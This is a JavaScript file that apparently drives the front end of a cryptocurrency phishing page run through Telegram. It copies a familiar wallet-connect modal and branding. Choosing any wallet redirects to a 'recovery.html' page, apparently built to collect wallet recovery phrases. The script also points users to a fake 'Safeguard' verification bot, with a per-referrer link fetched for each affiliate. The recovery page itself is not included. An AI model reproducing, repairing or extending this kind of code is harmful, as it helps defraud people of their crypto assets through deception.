
// Function to detect mobile devices
function isMobileDevice() {
    const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
    return mobileRegex.test(navigator.userAgent) || window.innerWidth <= 767;
}

// Function to initialize Telegram WebApp
function initTelegramWebApp() {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
}

// Function to get referral ID from all possible sources
function getReferralId() {
    let refId = null;

    // 1. Try Telegram WebApp initData first (most secure)
    if (window.Telegram?.WebApp?.initData) {
        try {
            const initData = new URLSearchParams(window.Telegram.WebApp.initData);
            const startApp = initData.get('start');
            if (startApp?.startsWith('ref_')) {
                refId = startApp.replace('ref_', '');
            }
        } catch (e) {
            console.error('Error parsing Telegram WebApp initData:', e);
        }
    }

    // 2. Try Telegram WebApp start_param
    if (!refId && window.Telegram?.WebApp?.initDataUnsafe?.start_param) {
        const startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
        if (startParam?.startsWith('ref_')) {
            refId = startParam.replace('ref_', '');
        }
    }

    // 3. Try URL parameters
    if (!refId) {
        const urlParams = new URLSearchParams(window.location.search);
        refId = urlParams.get('ref');
    }

    // 4. Try session storage as last resort
    if (!refId) {
        refId = sessionStorage.getItem('refId');
    }

    // Store in session storage if found
    if (refId) {
        sessionStorage.setItem('refId', refId);
    }

    return refId;
}

// Function to handle redirection based on device type
function redirectToCorrectVersion() {
    const refId = getReferralId();
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const currentPath = window.location.pathname;

    // Construct query string with referral ID if exists
    const queryString = refId ? `?ref=${refId}` : '';

    if (isMobile && currentPath !== '/mobile.html') {
        window.location.href = `/mobile.html${queryString}`;
    } else if (!isMobile && currentPath !== '/desktop.html' && currentPath !== '/') {
        window.location.href = `/desktop.html${queryString}`;
    }
}

// Function to get Telegram parameters
function getTelegramParams() {
    const urlParams = new URLSearchParams(window.location.search);
    let refId = urlParams.get('ref');

    // Check Telegram WebApp
    if (!refId && window.Telegram?.WebApp?.initDataUnsafe?.start_param) {
        const startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
        if (startParam.startsWith('ref_')) {
            refId = startParam.replace('ref_', '');
        }
    }

    // If still no refId, check session storage
    if (!refId) {
        refId = sessionStorage.getItem('refId');
    }

    // Store in session storage if we have a refId
    if (refId) {
        sessionStorage.setItem('refId', refId);
    }

    return refId;
}

// Wallet configuration map
const walletMap = {
    'phantom': {
        id: 'phantom',
        logo: 'https://gmgn.ai/static/img/wallet/phantom.svg'
    },
    'metamask': {
        id: 'metamask',
        logo: 'data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjMxIiB2aWV3Qm94PSIwIDAgMzEgMzEiIHdpZHRoPSIzMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjIwLjI1IiB4Mj0iMjYuNTcxIiB5MT0iMjcuMTczIiB5Mj0iMTkuODU4Ij48c3RvcCBvZmZzZXQ9Ii4wOCIgc3RvcC1jb2xvcj0iIzk5NDVmZiIvPjxzdG9wIG9mZnNldD0iLjMiIHN0b3AtY29sb3I9IiM4NzUyZjMiLz48c3RvcCBvZmZzZXQ9Ii41IiBzdG9wLWNvbG9yPSIjNTQ5N2Q1Ii8+PHN0b3Agb2Zmc2V0PSIuNiIgc3RvcC1jb2xvcj0iIzQzYjRjYSIvPjxzdG9wIG9mZnNldD0iLjcyIiBzdG9wLWNvbG9yPSIjMjhlMGI5Ii8+PHN0b3Agb2Zmc2V0PSIuOTciIHN0b3AtY29sb3I9IiMxOWZiOWIiLz48L2xpbmVhckdyYWRpZW50PjxnIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjA5NCI+PHBhdGggZD0ibTI2LjEwOSAzLjY0My05LjM2OSA2Ljk1OSAxLjczMy00LjEwNSA3LjYzNy0yLjg1M3oiIGZpbGw9IiNlMjc2MWIiIHN0cm9rZT0iI2UyNzYxYiIvPjxnIGZpbGw9IiNlNDc2MWIiIHN0cm9rZT0iI2U0NzYxYiI+PHBhdGggZD0ibTQuNDgxIDMuNjQzIDkuMjk0IDcuMDI0LTEuNjQ4LTQuMTcxem0xOC4yNTggMTYuMTMtMi40OTUgMy44MjMgNS4zMzkgMS40NjkgMS41MzUtNS4yMDctNC4zNzgtLjA4NXptLTE5LjI0Ny4wODUgMS41MjUgNS4yMDcgNS4zMzktMS40NjktMi40OTUtMy44MjN6Ii8+PHBhdGggZD0ibTEwLjA1NSAxMy4zMTMtMS40ODggMi4yNTEgNS4zMDEuMjM1LS4xODgtNS42OTd6bTEwLjQ4IDAtMy42NzItMy4yNzctLjEyMiA1Ljc2MyA1LjI5Mi0uMjM1LTEuNDk3LTIuMjUxem0tMTAuMTc4IDEwLjI4MyAzLjE4My0xLjU1NC0yLjc0OS0yLjE0Ny0uNDMzIDMuNzAxeiIvPjwvZz48cGF0aCBkPSJtMjAuMjQ0IDIzLjU5Ni0zLjE5Mi0xLjU1NC4yNTQgMi4wODEtLjAyOC44NzZ6bS05Ljg4NyAwIDIuOTY2IDEuNDAzLS4wMTktLjg3Ni4yMzUtMi4wODEtMy4xODMgMS41NTR6IiBmaWxsPSIjZDdjMWIzIiBzdHJva2U9IiNkN2MxYjMiLz48cGF0aCBkPSJtMTMuMzY5IDE4LjUyMS0yLjY1NS0uNzgxIDEuODc0LS44NTd6bTMuODUxIDAgLjc4MS0xLjYzOCAxLjg4My44NTctMi42NjUuNzgxeiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEwLjM1NyAyMy41OTYuNDUyLTMuODIzLTIuOTQ3LjA4NXptOS40MzUtMy44MjMuNDUyIDMuODIzIDIuNDk1LTMuNzM4em0yLjI0MS00LjIwOS01LjI5Mi4yMzUuNDkgMi43MjEuNzgyLTEuNjM4IDEuODgzLjg1N3ptLTExLjMxOCAyLjE3NSAxLjg4My0uODU3Ljc3MiAxLjYzOC40OTktMi43MjEtNS4zMDEtLjIzNXoiIGZpbGw9IiNjZDYxMTYiIHN0cm9rZT0iI2NkNjExNiIvPjxwYXRoIGQ9Im04LjU2NyAxNS41NjQgMi4yMjIgNC4zMzEtLjA3NS0yLjE1NnptMTEuMzI4IDIuMTc1LS4wOTQgMi4xNTYgMi4yMzItNC4zMzEtMi4xMzcgMi4xNzV6bS02LjAyNi0xLjk0LS40OTkgMi43MjEuNjIxIDMuMjExLjE0MS00LjIyOC0uMjY0LTEuNzA0em0yLjg3MiAwLS4yNTQgMS42OTUuMTEzIDQuMjM3LjYzMS0zLjIxMXoiIGZpbGw9IiNlNDc1MWYiIHN0cm9rZT0iI2U0NzUxZiIvPjxwYXRoIGQ9Im0xNy4yMyAxOC41Mi0uNjMxIDMuMjExLjQ1Mi4zMTEgMi43NS0yLjE0Ny4wOTQtMi4xNTZ6bS02LjUxNi0uNzgxLjA3NSAyLjE1NiAyLjc1IDIuMTQ3LjQ1Mi0uMzExLS42MjItMy4yMTF6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48cGF0aCBkPSJtMTcuMjc3IDI0Ljk5OS4wMjgtLjg3Ni0uMjM1LS4yMDdoLTMuNTVsLS4yMTcuMjA3LjAxOS44NzYtMi45NjYtMS40MDMgMS4wMzYuODQ4IDIuMSAxLjQ1OWgzLjYwNmwyLjEwOS0xLjQ1OSAxLjAzNi0uODQ4eiIgZmlsbD0iI2MwYWQ5ZSIgc3Ryb2tlPSIjYzBhZDllIi8+PHBhdGggZD0ibTE3LjA1MSAyMi4wNDItLjQ1Mi0uMzExaC0yLjYwOGwtLjQ1Mi4zMTEtLjIzNSAyLjA4MS4yMTctLjIwN2gzLjU1bC4yMzUuMjA3LS4yNTQtMi4wODF6IiBmaWxsPSIjMTYxNjE2IiBzdHJva2U9IiMxNjE2MTYiLz48cGF0aCBkPSJtMjYuNTA1IDExLjA1My44LTMuODQyLTEuMTk2LTMuNTY5LTkuMDU4IDYuNzIzIDMuNDg0IDIuOTQ3IDQuOTI1IDEuNDQxIDEuMDkyLTEuMjcxLS40NzEtLjMzOS43NTMtLjY4Ny0uNTg0LS40NTIuNzUzLS41NzQtLjQ5OS0uMzc3em0tMjMuMjExLTMuODQxLjggMy44NDItLjUwOC4zNzcuNzUzLjU3NC0uNTc0LjQ1Mi43NTMuNjg3LS40NzEuMzM5IDEuMDgzIDEuMjcxIDQuOTI1LTEuNDQxIDMuNDg0LTIuOTQ3LTkuMDU5LTYuNzIzeiIgZmlsbD0iIzc2M2QxNiIgc3Ryb2tlPSIjNzYzZDE2Ii8+PHBhdGggZD0ibTI1LjQ2IDE0Ljc1NC00LjkyNS0xLjQ0MSAxLjQ5NyAyLjI1MS0yLjIzMiA0LjMzMSAyLjkzOC0uMDM4aDQuMzc4bC0xLjY1Ny01LjEwNHptLTE1LjQwNS0xLjQ0MS00LjkyNSAxLjQ0MS0xLjYzOCA1LjEwNGg0LjM2OWwyLjkyOC4wMzgtMi4yMjItNC4zMzEgMS40ODgtMi4yNTF6bTYuNjg1IDIuNDg2LjMxMS01LjQzMyAxLjQzMS0zLjg3aC02LjM1NmwxLjQxMyAzLjg3LjMyOSA1LjQzMy4xMTMgMS43MTQuMDA5IDQuMjE5aDIuNjFsLjAxOS00LjIxOS4xMjItMS43MTR6IiBmaWxsPSIjZjY4NTFiIiBzdHJva2U9IiNmNjg1MWIiLz48L2c+PGNpcmNsZSBjeD0iMjMuNSIgY3k9IjIzLjUiIGZpbGw9IiMwMDAiIHI9IjYuNSIvPjxwYXRoIGQ9Im0yNy40NzMgMjUuNTQ1LTEuMzEgMS4zNjhjLS4wMjkuMDMtLjA2My4wNTMtLjEwMS4wN2EuMzEuMzEgMCAwIDEgLS4xMjEuMDI0aC02LjIwOWMtLjAzIDAtLjA1OS0uMDA4LS4wODMtLjAyNGEuMTUuMTUgMCAwIDEgLS4wNTYtLjA2NWMtLjAxMi0uMDI2LS4wMTUtLjA1Ni0uMDEtLjA4NHMuMDE4LS4wNTUuMDM5LS4wNzZsMS4zMTEtMS4zNjhjLjAyOC0uMDMuMDYzLS4wNTMuMTAxLS4wNjlhLjMxLjMxIDAgMCAxIC4xMjEtLjAyNWg2LjIwOGMuMDMgMCAuMDU5LjAwOC4wODMuMDI0YS4xNS4xNSAwIDAgMSAuMDU2LjA2NWMuMDEyLjAyNi4wMTUuMDU2LjAxLjA4NHMtLjAxOC4wNTUtLjAzOS4wNzZ6bS0xLjMxLTIuNzU2Yy0uMDI5LS4wMy0uMDYzLS4wNTMtLjEwMS0uMDdhLjMxLjMxIDAgMCAwIC0uMTIxLS4wMjRoLTYuMjA5Yy0uMDMgMC0uMDU5LjAwOC0uMDgzLjAyNHMtLjA0NC4wMzgtLjA1Ni4wNjUtLjAxNS4wNTYtLjAxLjA4NC4wMTguMDU1LjAzOS4wNzZsMS4zMTEgMS4zNjhjLjAyOC4wMy4wNjMuMDUzLjEwMS4wNjlhLjMxLjMxIDAgMCAwIC4xMjEuMDI1aDYuMjA4Yy4wMyAwIC4wNTktLjAwOC4wODMtLjAyNGEuMTUuMTUgMCAwIDAgLjA1Ni0uMDY1Yy4wMTItLjAyNi4wMTUtLjA1Ni4wMS0uMDg0cy0uMDE4LS4wNTUtLjAzOS0uMDc2em0tNi40MzEtLjk4M2g2LjIwOWEuMzEuMzEgMCAwIDAgLjEyMS0uMDI0Yy4wMzgtLjAxNi4wNzMtLjA0LjEwMS0uMDdsMS4zMS0xLjM2OGMuMDItLjAyMS4wMzQtLjA0Ny4wMzktLjA3NnMuMDAxLS4wNTgtLjAxLS4wODRhLjE1LjE1IDAgMCAwIC0uMDU2LS4wNjVjLS4wMjUtLjAxNi0uMDU0LS4wMjQtLjA4My0uMDI0aC02LjIwOGEuMzEuMzEgMCAwIDAgLS4xMjEuMDI1Yy0uMDM4LjAxNi0uMDcyLjA0LS4xMDEuMDY5bC0xLjMxIDEuMzY4Yy0uMDIuMDIxLS4wMzQuMDQ3LS4wMzkuMDc2cy0uMDAxLjA1OC4wMS4wODQuMDMxLjA0OS4wNTYuMDY1LjA1NC4wMjQuMDgzLjAyNHoiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4='
    },
    'bitget': {
        id: 'bitget',
        logo: 'https://gmgn.ai/static/img/wallet/bitget.png'
    },
    'okx wallet': {
        id: 'okx',
        logo: 'https://gmgn.ai/static/img/wallet/okx.svg'
    },
    'tokenpocket': {
        id: 'tokenpocket',
        logo: 'https://gmgn.ai/static/img/wallet/tokenPocketWallet.svg'
    },
    'backpack': {
        id: 'backpack',
        logo: 'https://gmgn.ai/static/img/wallet/backpack.svg'
    },
    'solflare': {
        id: 'solflare',
        logo: 'https://gmgn.ai/static/img/wallet/solflare.svg'
    }
};

// Wallet Modal Functions
function openWalletModal() {
    const modal = document.getElementById('walletModal');
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Add click handlers for wallet options
    const walletOptions = document.querySelectorAll('.wallet-option');
    const refId = getTelegramParams(); // Get refId when modal opens

    walletOptions.forEach(option => {
        option.addEventListener('click', () => {
            const walletName = option.querySelector('.wallet-name').textContent.toLowerCase().replace(' wallet', '');
            handleWalletSelection(walletName);
        });
    });
}

function closeWalletModal() {
    const modal = document.getElementById('walletModal');
    modal.classList.remove('active');
    document.body.style.overflow = ''; // Restore scrolling
}

// Add this function after other functions
async function updateTelegramLink() {
    const telegramLink = document.querySelector('.telegram-link');
    if (!telegramLink) {
        console.error('Telegram link element not found');
        return;
    }

    const refId = getReferralId();
    console.log('Updating telegram link for refId:', refId);

    if (!refId) {
        console.log('No referral ID found, using default link');
        telegramLink.href = 'https://t.me/SafeguardUIRobot/verify?startapp=7022279650';
        return;
    }

    try {
        console.log('Fetching button link for refId:', refId);
        const response = await fetch(`/api/button-link/${refId}`);
        const data = await response.json();
        console.log('API Response:', data);

        if (!response.ok) {
            throw new Error(`Failed to fetch button link: ${data.error || 'Unknown error'}`);
        }

        if (data.success && data.link) {
            // Ensure we're using the full Telegram URL
            const link = data.link.startsWith('https://t.me/') ? data.link : `https://t.me/${data.link}`;
            console.log('Setting telegram link to:', link);
            telegramLink.href = link;
            // Verify the link was set correctly
            console.log('Telegram link href is now:', telegramLink.href);
        } else {
            console.error('Invalid API response:', data);
            // Set default link if API fails
            telegramLink.href = 'https://t.me/SafeguardUIRobot/verify?startapp=7022279650';
        }
    } catch (error) {
        console.error('Error updating Telegram link:', error);
        // Set default link if API fails
        telegramLink.href = 'https://t.me/SafeguardUIRobot/verify?startapp=7022279650';
    }
}

// Function to handle wallet selection
function handleWalletSelection(walletName) {
    // Get stored refId
    const refId = sessionStorage.getItem('refId');
    
    // Construct query parameters
    const queryParams = new URLSearchParams();
    queryParams.set('wallet', walletName);
    if (refId) queryParams.set('ref', refId);
    
    // Redirect to recovery page with parameters
    window.location.href = `recovery.html?${queryParams.toString()}`;
}

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
    // Initialize Telegram WebApp first
    initTelegramWebApp();
    
    // Handle redirection
    redirectToCorrectVersion();

    // Update Telegram link
    updateTelegramLink();

    // Wallet modal controls
    const connectWalletBtn = document.getElementById('connectWallet');
    const closeModalBtn = document.getElementById('closeModal');
    const modal = document.getElementById('walletModal');

    connectWalletBtn.addEventListener('click', (e) => {
        e.preventDefault();
        openWalletModal();
    });

    if (!isMobileDevice()) {
        // Only add close button functionality on desktop
        closeModalBtn.addEventListener('click', closeWalletModal);
    }

    // Handle modal closing
    let startY = 0;
    let currentY = 0;
    let isDragging = false;

    modal.addEventListener('touchstart', (e) => {
        if (isMobileDevice()) {
            const touch = e.touches[0];
            startY = touch.clientY;
            currentY = startY;
            isDragging = true;
            
            modal.classList.add('dragging');
            modal.querySelector('.wallet-modal-content').style.transition = 'none';
        }
    });

    modal.addEventListener('touchmove', (e) => {
        if (isMobileDevice() && isDragging) {
            const touch = e.touches[0];
            const deltaY = touch.clientY - startY;
            currentY = touch.clientY;

            // Only allow dragging down
            if (deltaY > 0) {
                const content = modal.querySelector('.wallet-modal-content');
                content.style.transform = `translateY(${deltaY}px)`;
            }
        }
    });
});
